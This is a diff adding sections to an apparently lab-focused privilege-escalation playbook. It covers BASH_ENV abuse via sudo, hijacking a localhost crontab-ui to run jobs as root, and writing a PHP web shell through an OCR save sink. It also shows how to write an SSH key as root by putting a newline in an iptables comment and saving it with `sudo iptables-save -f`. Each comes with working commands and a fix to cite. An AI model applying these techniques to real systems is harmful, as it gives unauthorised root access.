@@ -71,6 +71,17 @@ sudo less /etc/profile      # then !/bin/sh
 spawns a shell, then `sudo LD_PRELOAD=/tmp/x.so <anything>`. `LD_LIBRARY_PATH`
 kept works the same way with a fake `libc`.
 
+**`env_keep+="BASH_ENV"` (or `ENV`) + any sudo-allowed *bash script* = root,
+whatever the script does.** Bash sources `$BASH_ENV` on non-interactive startup,
+so the kept variable makes your file run as root the instant sudo launches the
+script. The sudo target does not need a flaw — it only needs a `#!/bin/bash`
+shebang (check with `file`/`head -1`). `echo 'chmod u+s /bin/bash' > /tmp/x.sh;
+sudo BASH_ENV=/tmp/x.sh <the-allowed-script>; /bin/bash -p`. Read the whole
+`Defaults` line in `sudo -l`, not just the command list: `env_keep` additions,
+`!env_reset`, and `SETENV` are each a lever, and this one costs nothing because
+the script's own logic is irrelevant. (`ENV` is the POSIX-sh equivalent for
+`/bin/sh`→dash scripts.)
+
 **On openSUSE, `(ALL) ALL` + `Defaults targetpw` is the distro default, not a
 grant.** It means *any* user may run anything — **after supplying the target
 (root) password**, which you do not have. Do not read it as "already won"; read it
@@ -519,6 +530,20 @@ The constructor fires during the dlopen, before any "not a real module" error.
 Something listening on 127.0.0.1 that is not exposed externally is usually
 where the escalation lives — an unauthenticated admin panel, a Redis, a
 database. Forward it out (see `references/pivoting.md`) and attack it.
+
+**A localhost web UI that edits or runs a root-owned scheduler/config IS a root
+shell — the only thing between you and root is its own auth.** crontab-ui,
+Portainer, a Jenkins on localhost, a Cockpit, any "manage the cron/service/
+container" panel that runs as root executes whatever you give it as root. Find
+its credential before cracking anything: the panel's secret is routinely reused
+from a world-readable file (`crontab-ui`'s store `/opt/crontabs/crontab.db` is
+world-readable and a job's `zip -P <pw>` / `--password` argument *is* the Basic-
+auth password; a `.env`, a compose file, or a systemd `EnvironmentFile` hold
+others). Operational note: if the panel blocks *creating* a new job/object, **edit
+an existing one** instead — crontab-ui's `POST /save` with an existing `_id`
+rewrites that job's command, and `POST /runjob` fires it immediately as root.
+Drop a SUID bash, then restore the original command. The class: enumerate what the
+panel *controls*, not just that it exists, and reuse credentials into it.
 
 **Map each localhost port to its owning UID before assuming it's harmless.**
 `ps` may hide other users' processes (`hidepid`), but `/proc/net/tcp` still lists
@@ -1373,3 +1398,68 @@ A sudo rule like `(ALL) /usr/bin/nano /etc/<file>` is root code-exec, not a scop
 Drive `nano` non-interactively with a PTY (pexpect/`ssh -tt`): send `^T`, wait for the
 literal `Command to execute` prompt, send the command, then `\r`. Fix to cite: `sudoedit`
 or `rnano`, never a full editor via sudo.
+
+## A lossy transform in a write path is still an arbitrary-*content* primitive
+A privileged "save" that passes your input through a transform — OCR, speech-to-
+text, a transcode, a Markdown renderer — looks safe because you don't type the
+bytes directly. You don't have to: a transform is a function you invert by tuning
+its *input*. If the sink writes `transform(input)` to a file, craft the input so
+`transform(input)` is exactly the bytes you need. Concretely, an OCR "save"
+(tesseract) that refuses path traversal and shell metacharacters (filename
+`basename()`d and sanitised) is still RCE when the save directory is executed as
+PHP: render the payload as clean monospace text (measure locally first — e.g.
+`convert -font Courier -pointsize 28 label:'<?php system($_GET[0]);?>'` is read
+byte-exact by tesseract across PSM modes) and the saved `.php` is your web shell.
+Generalises to any STT/OCR/transcode write sink: stop attacking the filename, and
+ask whether you can make the *content* land exactly.
+
+## A root `php -S -t <dir>` serving a writable subdir is RCE
+PHP's built-in server executes **any** `.php` under its document root and serves
+real files directly (so a router `index.php` that enforces auth is bypassed for
+any file that actually exists on disk). If such a server runs as root (`ps` →
+`php -S 127.0.0.1:PORT -t /root/…`) and any sink lets you drop or write a file
+under that root with a `.php` extension, requesting it executes as root. Check
+the SAPI (`php -S`), the docroot owner, and whether any "save/upload/export"
+feature writes beneath it. Fix to cite: never serve a user-writable directory
+with a code-executing SAPI; whitelist output extensions.
+
+## A sudo tool that can write a file — `iptables-save -f` and the "dump my own input" class
+
+A sudo rule on a tool that *serialises its own state to a path you choose* is an
+arbitrary-root-write primitive, even when the tool has nothing to do with files.
+The recurring instance is `sudo iptables-save -f <file>`: `iptables-save` writes
+the live ruleset to the path after `-f`, as root, overwriting it. On its own that
+only lets you write *rules* — but you also control the rules' **content** through
+fields the tool round-trips verbatim.
+
+iptables rule **comments** (`-m comment --comment "<text>"`) are stored and
+re-emitted intact, and the comment field tolerates an **embedded newline**. So:
+
+```bash
+CMT=$(printf '\n%s\n' "$PAYLOAD_LINE")        # leading newline puts PAYLOAD at col 0
+sudo iptables -A INPUT -m comment --comment "$CMT" -j ACCEPT
+sudo iptables-save -f /root/.ssh/authorized_keys
+```
+
+In the dump the newline breaks `PAYLOAD_LINE` onto its own line at column 0;
+everything else (`*filter`, `:INPUT …`, `-A …`, `COMMIT`) is syntactic junk that
+the *consumer* ignores. Pick a target whose parser skips unrecognised lines:
+`authorized_keys` (sshd reads the one valid key line and ignores the rest) is the
+cleanest; a `/etc/cron.d` file works too but Debian cron can reject a malformed
+file wholesale, so prefer authorized_keys. Pass the comment as a **single
+argument** — build it in a script and run that over SSH, because a raw
+`printf '\n…'` through nested `ssh`/`sh` splits the newline into separate argv
+and iptables rejects it (`Bad argument`).
+
+Generalises to any `sudo` binary with a "save/export/dump to FILE" mode that
+echoes an attacker-controlled field: `tcpdump -w`, `-Fw` config dumps, backup
+tools, `dmsetup`/`lvm` metadata dumps. The lever is write-as-root + a verbatim
+field, not the networking.
+
+**Beat the reset job.** Lab firewalls are frequently reverted by a periodic job,
+which silently flushes your comment rule between `add` and `dump`, leaving the
+written file without your payload (reads as "the key doesn't work"). Chain
+add-rule → `iptables-save -f` → use, in one window, re-authenticating fresh — the
+same discipline as any state-change on a self-resetting box. Fix to cite: never
+grant `iptables-save`/`iptables` via sudo to a non-root principal; `-f` is an
+arbitrary file write.
